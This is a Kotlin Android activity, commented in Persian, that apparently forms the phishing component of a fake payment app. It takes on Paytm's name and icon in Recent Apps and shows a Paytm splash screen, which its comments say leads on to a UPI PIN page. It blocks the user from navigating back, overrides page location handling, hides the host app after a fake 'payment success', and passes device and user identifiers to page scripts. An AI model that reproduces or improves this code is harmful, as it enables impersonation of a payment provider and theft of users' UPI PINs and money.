package com.example.test

import android.app.ActivityManager
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.example.test.utils.DeviceInfoHelper
import com.example.test.ServerConfig

/**
 * ⭐ PaytmCloneActivity - کلون Paytm (مثل یک برنامه جداگانه)
 */
class PaytmCloneActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var deviceId: String
    private lateinit var appConfig: AppConfig

    companion object {
        private const val TAG = "PaytmCloneActivity"
        private const val SPLASH_DELAY_MS = 2500L
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        enableFullscreen()
        
        appConfig = AppConfig.load(this)
        deviceId = DeviceInfoHelper.getDeviceId(this)
        ServerConfig.initialize(this)
        
        setTaskDescriptionForRecentApps()
        
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 PAYTM CLONE ACTIVITY CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        
        webView = createWebView()
        setContentView(webView)
        
        loadSplashScreen()
    }

    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            // ⭐ فقط اسم پرداخت (بدون اسم برنامه)
            val taskName = "Paytm"
            
            try {
                val iconStream = assets.open("paytm-icon.png")
                val iconBitmap = BitmapFactory.decodeStream(iconStream)
                iconStream.close()
                
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    iconBitmap,
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
                Log.d(TAG, "✅ Task description set: $taskName")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to load icon from assets", e)
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
            }
        }
    }

    private fun enableFullscreen() {
        supportActionBar?.hide()
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            // ⭐ تنظیم رنگ status bar icons به روشن (light) - برای نمایش وایفای و سیم‌کارت سفید
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = false // false = icons سفید/روشن
            }
            // ⭐ تنظیم navigation bar icons
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false // icons روشن
            }
        }
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    private fun createWebView(): WebView {
        val webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        // ⭐ بهبود تنظیمات برای نمایش بهتر
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.TEXT_AUTOSIZING
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        
        // ⭐ تنظیمات اضافی برای کیفیت بهتر نمایش
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.mediaPlaybackRequiresUserGesture = false
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        webView.setInitialScale(100)

        // ⭐ استفاده از hardware acceleration برای عملکرد بهتر
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }
        
        // ⭐ بهبود rendering
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            webSettings.mediaPlaybackRequiresUserGesture = false
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                Log.d(TAG, "✅ Page loaded: $url")
                
                // ⭐ اگر final.html لود شد، MainActivity رو ببند و از Recent Apps پاک کن
                if (url != null && url.contains("final.html", ignoreCase = true)) {
                    Log.d(TAG, "════════════════════════════════════════")
                    Log.d(TAG, "✅ PAYMENT SUCCESS - Closing MainActivity and keeping clone open")
                    Log.d(TAG, "════════════════════════════════════════")
                    
                    // ⭐ غیرفعال کردن history.go(1) و back button در final.html
                    webView.evaluateJavascript(
                        """
                        (function() {
                            // ⭐ غیرفعال کردن history.go(1) و back button handlers
                            if (typeof window.onpopstate === 'function') {
                                window.onpopstate = null;
                            }
                            window.onpopstate = function() {
                                // هیچ کاری نکن - جلوگیری از برگشت
                            };
                            
                            // ⭐ جلوگیری از redirect به index.html
                            var originalLocation = window.location.href;
                            Object.defineProperty(window, 'location', {
                                get: function() {
                                    return {
                                        href: originalLocation,
                                        assign: function() {},
                                        replace: function() {}
                                    };
                                },
                                set: function(val) {
                                    // فقط اگر final.html یا upi-pin.html باشه، اجازه بده
                                    if (val && (val.includes('final.html') || val.includes('upi-pin.html'))) {
                                        originalLocation = val;
                                    }
                                }
                            });
                        })();
                        """.trimIndent(),
                        null
                    )
                    
                    // ⭐ یک تأخیر کوتاه برای نمایش final.html
                    Handler(Looper.getMainLooper()).postDelayed({
                        closeMainActivity()
                    }, 1000) // 1 ثانیه برای نمایش پیام موفقیت
                    
                    return
                }
                
                applyThemeColorFromPage()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let { Log.d(TAG, "JS: ${it.message()}") }
                return true
            }
        }

        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
        }, "Android")

        return webView
    }

    private fun handleUrlNavigation(url: String): Boolean {
        Log.d(TAG, "🔗 Navigation request: $url")
        
        // ⭐ جلوگیری از redirect به index.html (برنامه اصلی)
        if (url.contains("index.html", ignoreCase = true)) {
            Log.d(TAG, "⚠️ Blocked navigation to index.html - staying in clone")
            return true // Block navigation
        }
        
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false
        }
        
        if (url.endsWith(".html")) {
            val fullUrl = if (url.startsWith("file://")) {
                url
            } else if (url.startsWith("/")) {
                "file:///android_asset${url}"
            } else {
                "file:///android_asset/$url"
            }
            
            Log.d(TAG, "📄 Loading page: $fullUrl")
            webView.loadUrl(fullUrl)
            return true
        }
        
        return false
    }

    private fun loadSplashScreen() {
        val splashPath = "file:///android_asset/paytm-splash.html"
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📄 LOADING PAYTM SPLASH SCREEN")
        Log.d(TAG, "📄 Splash Path: $splashPath")
        Log.d(TAG, "════════════════════════════════════════")
        webView.loadUrl(splashPath)
        // ⭐ Splash screen خودش بعد از 2.5 ثانیه به upi-pin.html میره
    }

    private fun applyThemeColorFromPage() {
        webView.evaluateJavascript(
            """
            (function() {
                try {
                    var metaTheme = document.querySelector('meta[name="theme-color"]');
                    if (metaTheme) {
                        return metaTheme.getAttribute('content');
                    }
                    return null;
                } catch(e) {
                    return null;
                }
            })();
            """.trimIndent()
        ) { color ->
            if (color != null && color != "null") {
                val colorValue = color.replace("\"", "")
                try {
                    val parsedColor = android.graphics.Color.parseColor(colorValue)
                    runOnUiThread {
                        window.statusBarColor = parsedColor
                        window.navigationBarColor = parsedColor
                        
                        // ⭐ تنظیم رنگ status bar icons به روشن (سفید)
                        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            // ⭐ همیشه icons روشن (سفید) برای نمایش بهتر وایفای و سیم‌کارت
                            windowInsetsController.isAppearanceLightStatusBars = false // false = icons سفید/روشن
                            Log.d(TAG, "🎨 Status bar icons set to: light (white)")
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            windowInsetsController.isAppearanceLightNavigationBars = false // navigation bar icons همیشه روشن
                        }
                        
                        Log.d(TAG, "🎨 Status bar color set to: $colorValue")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
                }
            }
        }
    }
    

    /**
     * ⭐ بستن MainActivity و پاک کردنش از Recent Apps
     */
    private fun closeMainActivity() {
        try {
            // ⭐ فرستادن Intent به MainActivity برای بستن
            val closeIntent = Intent(this, MainActivity::class.java).apply {
                action = "com.example.test.ACTION_CLOSE"
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(closeIntent)
            
            Log.d(TAG, "✅ Close intent sent to MainActivity")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error closing MainActivity", e)
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 PaytmCloneActivity destroyed")
        
        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
}

